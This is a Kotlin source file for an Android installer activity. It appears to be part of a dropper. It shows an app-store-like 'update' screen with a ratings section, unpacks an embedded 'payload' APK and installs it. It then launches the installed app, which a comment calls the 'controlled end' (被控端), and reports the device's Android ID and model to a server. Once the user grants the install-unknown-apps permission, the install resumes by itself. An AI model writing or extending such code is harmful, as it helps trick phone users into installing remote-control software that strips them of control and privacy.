package com.vibelink.installer

import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.provider.Settings
import android.view.View
import android.view.animation.LinearInterpolator
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.lifecycleScope
import com.vibelink.installer.databinding.ActivityInstallBinding
import com.vibelink.installer.network.PaymentApiClient
import com.vibelink.installer.vpn.VpnBootstrap
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class InstallActivity : AppCompatActivity() {
    private lateinit var binding: ActivityInstallBinding
    private val apiClient = PaymentApiClient()
    private var isWorking = false
    private var receiverRegistered = false
    /** 避免 onResume 反复 finish 回首页 */
    private var homeHandoffStarted = false
    private var spinnerAnimator: ObjectAnimator? = null
    /** 已把用户送去「允许安装未知应用」页，等权限给了一路自动续跑，不用再点一次更新 */
    @Volatile
    private var awaitingInstallPermission = false
    private var pendingAutoInstall = false
    private var permissionWaitStartedAt = 0L
    private val permissionPollHandler = Handler(Looper.getMainLooper())
    private val permissionPollRunnable = object : Runnable {
        override fun run() {
            if (!awaitingInstallPermission) {
                return
            }
            if (ApkInstallHelper.canRequestInstall(this@InstallActivity)) {
                stopAwaitingInstallPermission()
                if (lifecycle.currentState.isAtLeast(Lifecycle.State.RESUMED)) {
                    // 授权完成：直接续跑安装，用户不用回页面再点一次
                    startInstallFlow()
                } else {
                    // 还在系统设置页上面：回前台时 onResume 会接着装（后台不能抢先 commit）
                    pendingAutoInstall = true
                }
                return
            }
            if (SystemClock.elapsedRealtime() - permissionWaitStartedAt > PERMISSION_WAIT_TIMEOUT_MS) {
                stopAwaitingInstallPermission()
                refreshUi()
                return
            }
            permissionPollHandler.postDelayed(this, PERMISSION_POLL_INTERVAL_MS)
        }
    }

    private val installResultReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                InstallResultReceiver.ACTION_INSTALL_SUCCESS -> {
                    isWorking = false
                    reportPayloadInstall(status = "success", errorMessage = null)
                    RemoteClientChecker.consumePendingOpenClient(this@InstallActivity)
                    openClientForSetup(force = true)
                    if (RemoteClientChecker.isReady(this@InstallActivity)) {
                        returnToHome()
                    } else {
                        hideInstallingPanel()
                        refreshUi()
                    }
                }
                InstallResultReceiver.ACTION_INSTALL_FAILED -> {
                    isWorking = false
                    val message = intent.getStringExtra(InstallResultReceiver.EXTRA_ERROR_MESSAGE) ?: "unknown"
                    reportPayloadInstall(status = "failed", errorMessage = message)
                    hideInstallingPanel()
                    binding.installStatusText.visibility = View.VISIBLE
                    binding.installStatusText.text = getString(R.string.install_error, message)
                    binding.installPrimaryButton.isEnabled = true
                    refreshUi()
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!VpnBootstrap.isAuthorized(this)) {
            startActivity(
                Intent(this, MainActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                },
            )
            finish()
            return
        }
        binding = ActivityInstallBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.installAppNameText.text = clientAppName()
        binding.installPrimaryButton.setOnClickListener { startInstallFlow() }
        binding.installMoreInfoButton.setOnClickListener {
            binding.installContentScroll.smoothScrollTo(0, binding.installRatingsTitle.top)
        }
        registerInstallReceiver()
        refreshUi()
    }

    override fun onDestroy() {
        stopSpinnerAnimation()
        stopAwaitingInstallPermission()
        unregisterInstallReceiver()
        super.onDestroy()
    }

    override fun onResume() {
        super.onResume()
        if (!VpnBootstrap.isAuthorized(this)) {
            startActivity(
                Intent(this, MainActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                },
            )
            finish()
            return
        }
        if (RemoteClientChecker.isReady(this)) {
            returnToHome()
            return
        }
        if (RemoteClientChecker.consumePendingOpenClient(this)) {
            openClientForSetup(force = true)
        }
        if (awaitingInstallPermission) {
            // 刚从「允许安装未知应用」页返回：立刻复查一次，有权限就直接装
            if (ApkInstallHelper.canRequestInstall(this)) {
                stopAwaitingInstallPermission()
                startInstallFlow()
                return
            }
            startPermissionPoll()
        } else if (pendingAutoInstall) {
            pendingAutoInstall = false
            startInstallFlow()
            return
        }
        if (!isWorking) {
            hideInstallingPanel()
            refreshUi()
        }
    }

    override fun onPause() {
        // 后台不轮询，也不在后台 commit 安装会话（确认页会被顶到别人后面）
        permissionPollHandler.removeCallbacks(permissionPollRunnable)
        super.onPause()
    }

    private fun registerInstallReceiver() {
        if (receiverRegistered) {
            return
        }
        val filter = IntentFilter().apply {
            addAction(InstallResultReceiver.ACTION_INSTALL_FAILED)
            addAction(InstallResultReceiver.ACTION_INSTALL_SUCCESS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installResultReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            @Suppress("UnspecifiedRegisterReceiverFlag")
            registerReceiver(installResultReceiver, filter)
        }
        receiverRegistered = true
    }

    private fun unregisterInstallReceiver() {
        if (!receiverRegistered) {
            return
        }
        runCatching { unregisterReceiver(installResultReceiver) }
        receiverRegistered = false
    }

    /** B 已就绪：回首页（不再弹绑定） */
    private fun returnToHome() {
        if (homeHandoffStarted) {
            return
        }
        homeHandoffStarted = true
        startActivity(
            Intent(this, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            },
        )
        finish()
    }

    private fun refreshUi() {
        val installed = RemoteClientChecker.isInstalled(this)
        val ready = RemoteClientPermissionChecker.isClientReady(this)
        binding.installPrimaryButton.text = getString(R.string.install_update)
        binding.installPrimaryButton.isEnabled = !isWorking
        if (isWorking) {
            return
        }
        when {
            ready -> {
                binding.installStatusText.visibility = View.VISIBLE
                binding.installStatusText.text =
                    getString(R.string.install_permissions_ready, clientAppName())
            }
            installed -> {
                binding.installStatusText.visibility = View.VISIBLE
                binding.installStatusText.text =
                    getString(R.string.install_permissions_incomplete, clientAppName())
            }
            else -> {
                binding.installStatusText.visibility = View.GONE
                binding.installStatusText.setText(R.string.install_idle)
            }
        }
    }

    private fun showInstallingPanel(percent: Int) {
        binding.installProgressPanel.visibility = View.VISIBLE
        binding.installContentScroll.visibility = View.GONE
        updateInstallingProgress(percent)
        startSpinnerAnimation()
    }

    private fun hideInstallingPanel() {
        stopSpinnerAnimation()
        binding.installProgressPanel.visibility = View.GONE
        binding.installContentScroll.visibility = View.VISIBLE
    }

    private fun updateInstallingProgress(@Suppress("UNUSED_PARAMETER") percent: Int) {
        // 不展示百分比；进度条保持 indeterminate 光影扫动
        binding.installHorizontalProgress.isIndeterminate = true
        binding.installProgressLabel.setText(R.string.install_installing)
    }

    private fun startSpinnerAnimation() {
        if (spinnerAnimator?.isRunning == true) {
            return
        }
        spinnerAnimator = ObjectAnimator.ofFloat(binding.installSpinner, View.ROTATION, 0f, 360f).apply {
            duration = 1200L
            interpolator = LinearInterpolator()
            repeatCount = ValueAnimator.INFINITE
            start()
        }
    }

    private fun stopSpinnerAnimation() {
        spinnerAnimator?.cancel()
        spinnerAnimator = null
        binding.installSpinner.rotation = 0f
    }

    private fun openClientForSetup(force: Boolean) {
        if (!force && !RemoteClientChecker.isInstalled(this)) {
            return
        }
        val launched = RemoteClientChecker.launchClient(this)
        if (!launched) {
            Toast.makeText(
                this,
                getString(R.string.install_open_client_failed, clientAppName()),
                Toast.LENGTH_SHORT,
            ).show()
        }
    }

    private fun clientAppName(): String = getString(R.string.client_app_name)

    /** 在等「允许来自此来源的应用」授权：开一个短周期轮询兜底（部分 ROM 返回不发 onResume 之外的信号） */
    private fun startPermissionPoll() {
        permissionPollHandler.removeCallbacks(permissionPollRunnable)
        permissionPollHandler.postDelayed(permissionPollRunnable, PERMISSION_POLL_INTERVAL_MS)
    }

    private fun stopAwaitingInstallPermission() {
        awaitingInstallPermission = false
        pendingAutoInstall = false
        permissionPollHandler.removeCallbacks(permissionPollRunnable)
    }

    private fun startInstallFlow() {
        if (isWorking) {
            return
        }
        if (!VpnBootstrap.isAuthorized(this)) {
            Toast.makeText(this, R.string.vpn_permission_required, Toast.LENGTH_LONG).show()
            startActivity(
                Intent(this, MainActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                },
            )
            finish()
            return
        }
        // 已安装但权限未齐：点「更新」→ 打开被控端继续授权
        if (RemoteClientChecker.isInstalled(this) &&
            !RemoteClientPermissionChecker.isClientReady(this)
        ) {
            openClientForSetup(force = true)
            return
        }
        if (!ApkInstallHelper.canRequestInstall(this)) {
            Toast.makeText(this, R.string.install_permission_hint, Toast.LENGTH_SHORT).show()
            // 记住「用户是奔着安装来的」，授权返回后自动接着装
            awaitingInstallPermission = true
            permissionWaitStartedAt = SystemClock.elapsedRealtime()
            ApkInstallHelper.openInstallPermissionSettings(this)
            startPermissionPoll()
            return
        }

        isWorking = true
        binding.installPrimaryButton.isEnabled = false
        showInstallingPanel(0)

        lifecycleScope.launch {
            runCatching {
                if (!PayloadApkHelper.hasEmbeddedPayload(this@InstallActivity)) {
                    throw IllegalStateException(getString(R.string.install_error_no_payload))
                }
                val apkFile = withContext(Dispatchers.IO) {
                    PayloadApkHelper.copyToCache(this@InstallActivity) { percent ->
                        runOnUiThread {
                            if (!isWorking) {
                                return@runOnUiThread
                            }
                            // 解包占 0–80%
                            updateInstallingProgress((percent * 0.8).toInt())
                        }
                    }
                }
                withContext(Dispatchers.Main) {
                    if (isWorking) {
                        updateInstallingProgress(85)
                    }
                }
                withContext(Dispatchers.IO) {
                    ApkInstallHelper.installApk(this@InstallActivity, apkFile)
                }
                withContext(Dispatchers.Main) {
                    if (isWorking) {
                        updateInstallingProgress(100)
                    }
                }
            }.onFailure { error ->
                reportPayloadInstall(
                    status = "failed",
                    errorMessage = error.message ?: "unknown",
                )
                isWorking = false
                hideInstallingPanel()
                binding.installStatusText.visibility = View.VISIBLE
                binding.installStatusText.text = getString(
                    R.string.install_error,
                    error.message ?: "unknown",
                )
                binding.installPrimaryButton.isEnabled = true
                refreshUi()
            }
        }
    }

    private fun reportPayloadInstall(status: String, errorMessage: String?) {
        lifecycleScope.launch(Dispatchers.IO) {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                ?.trim()
                .orEmpty()
            apiClient.reportApkDownload(
                androidId = androidId,
                model = Build.MODEL,
                installerPackage = packageName,
                apkUrl = "asset://${PayloadApkHelper.ASSET_PATH}",
                status = status,
                errorMessage = errorMessage,
            )
        }
    }

    private companion object {
        const val PERMISSION_POLL_INTERVAL_MS = 400L
        /** 超时后放弃自动续跑，交回用户手动点（避免用户拒绝后被无限续跑骚扰） */
        const val PERMISSION_WAIT_TIMEOUT_MS = 180_000L
    }
}
